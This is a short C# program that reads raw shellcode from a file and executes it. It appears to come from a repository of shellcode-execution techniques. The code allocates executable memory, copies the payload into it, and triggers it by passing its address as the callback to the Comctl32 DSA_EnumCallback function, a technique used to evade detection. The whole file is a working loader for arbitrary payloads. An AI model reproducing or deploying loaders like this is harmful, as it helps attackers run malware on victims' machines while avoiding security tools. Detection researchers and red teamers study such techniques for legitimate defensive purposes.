// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DSA_EnumCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: DSA_EnumCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            IntPtr hDSA = DSA_Create(1, 1);

            DSA_InsertItem(hDSA, 0x7fffffff, hDSA); //Append

            DSA_EnumCallback(hDSA, hAlloc, IntPtr.Zero);

            DSA_Destroy(hDSA);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Comctl32.dll")]
        static extern IntPtr DSA_Create(
             int cbItem,
             int cItemGrow);

        [DllImport("Comctl32.dll")]
        static extern void DSA_InsertItem(
             IntPtr hdsa,
             int i,
             IntPtr pItem);

        [DllImport("Comctl32.dll")]
        static extern void DSA_EnumCallback(
             IntPtr hdsa,
             IntPtr pfnCB,
             IntPtr pData);

        [DllImport("Comctl32.dll")]
        static extern bool DSA_Destroy(IntPtr hdsa);
    }
}
